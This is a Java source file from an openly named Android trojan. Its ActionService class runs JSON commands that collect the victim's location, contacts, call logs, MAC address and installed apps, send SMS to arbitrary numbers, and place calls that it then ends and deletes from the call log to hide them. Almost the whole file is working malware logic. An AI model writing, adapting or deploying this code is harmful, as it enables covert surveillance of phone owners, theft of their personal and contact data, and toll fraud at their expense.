package trojan.android.android_trojan.Action;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.StringCharacterIterator;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.json.*;

import trojan.android.android_trojan.Action.BroadcastReceiver.PhoneStateReceiver;


public class ActionService {

    private static final String TAG = "ActionService";
    private Context context;
    private String result = null;


    public ActionService(Context context){
        this.context = context;
    }

    public String action(String arg) {
        JSONObject argjson;
        try {
            argjson = new JSONObject(arg);
            getLocation(argjson);
            getContacts(argjson);
            getCallLog(argjson);
            getMacAddress(argjson);
            SendSMS(argjson);
            getInstalledApps(argjson);
            call(argjson);
        }catch (JSONException ex){
            Log.d(TAG, ex.getMessage());
            this.result = "Error JSON";
        }

        return result;
    }

    //Get current location
    private void getLocation(JSONObject argjson) {
        if (!argjson.has("location")){
            return;
        }

        //Get location manager
        LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);
        //get the best provider to obtain the current location
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        String[] result = new String[2];

        //try to get latitude and longitude
        try {
            result[0] = "Latitude " + String.valueOf(location.getLatitude());
            result[1] = "Longitude " + String.valueOf(location.getLongitude());
        } catch (Exception ex) {//if this failed the method return 0,0
            Log.d(TAG, ex.getMessage());
            result[0] = "0";
            result[1] = "0";
        }


        this.result = new JSONArray(Arrays.asList(result)).toString();
    }


    //get the contact list
    private void getContacts(JSONObject argjson) {
        if (!argjson.has("contacts")){
            return;
        }

        ContentResolver cr = this.context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        try {
                            contacts.add(new String[]{
                                    URLEncoder.encode(name, "UTF-8"),
                                    URLEncoder.encode(phoneNo, "UTF-8")});
                        } catch (UnsupportedEncodingException e) {
                            e.printStackTrace();
                        }
                    }
                    pCur.close();
                }
            }
        }
        this.result = new JSONArray(contacts).toString();
    }

    //get calls log
    private void getCallLog(JSONObject argjson) {
        if (!argjson.has("calllogs")){
            return;
        }

        ArrayList<String[]> callLog = new ArrayList<String[]>();
        String columns[] = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
        if (cursor.moveToFirst()) {
            do {
                try {
                    callLog.add(new String[]{
                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)), "UTF-8"),
                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)), "UTF-8"),
                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)), "UTF-8"),
                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)), "UTF-8"),
                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)), "UTF-8")
                    });
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
            } while (cursor.moveToNext());
        }
        this.result = new JSONArray(callLog).toString();
    }


    //get current Mac Address
    private void getMacAddress(JSONObject argjson) {
        if (!argjson.has("mac")){
            return;
        }

        WifiManager manager = (WifiManager) this.context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = manager.getConnectionInfo();
        this.result = info.getMacAddress();
    }

    //Send SMS
    private void SendSMS(JSONObject argjson) throws JSONException {
        if (!argjson.has("sendsms")){
            return;
        }

        String numTelephone;
        String message;

        JSONArray array = argjson.getJSONArray("sendsms");
        numTelephone = array.get(0).toString();
        message = array.get(1).toString();

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(numTelephone, null, message, null, null);

        this.result = "message send";
    }

    //Get current installed apps
    private void getInstalledApps(JSONObject argjson) {
        if (!argjson.has("packages")){
            return;
        }

        boolean getSysPackages = true;
        ArrayList<String[]> packages = new ArrayList<String[]>();
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);

        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }

            try {
                packages.add(new String[]{
                        URLEncoder.encode(p.applicationInfo.loadLabel(context.getPackageManager()).toString(), "UTF-8"),
                        URLEncoder.encode(p.packageName, "UTF-8"),
                        URLEncoder.encode(p.versionName, "UTF-8"),
                        URLEncoder.encode(String.valueOf(p.versionCode), "UTF-8")
                });
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        this.result = new JSONArray(packages).toString();
    }

    public void call(JSONObject argjson) throws JSONException {
        if (!argjson.has("call")){
            return;
        }

        String num;
        long time;

        JSONArray array = argjson.getJSONArray("call");
        num = array.get(0).toString();
        time = Long.valueOf(array.get(1).toString());
        Log.d(TAG, num + " " + time);

        if (time > 1000) {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + num));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            Log.d(TAG, "Start call");
            PhoneStateReceiver phoneStateReceiver = new PhoneStateReceiver();

            Tools.sleep(time);

            phoneStateReceiver.onReceive(context, intent);
            phoneStateReceiver.killCall(context);

            Log.d(TAG, "Stop call");

            Tools.sleep(1000);

            String strNumberOne[] = {num};
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
            if (cursor.moveToFirst()) {
                do {
                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    context.getContentResolver().delete(
                            CallLog.Calls.CONTENT_URI,
                            CallLog.Calls._ID + "= ? ",
                            new String[]{String.valueOf(idOfRowToDelete)});
                } while (cursor.moveToNext());
            }
        }

        this.result = "call done";
    }
}
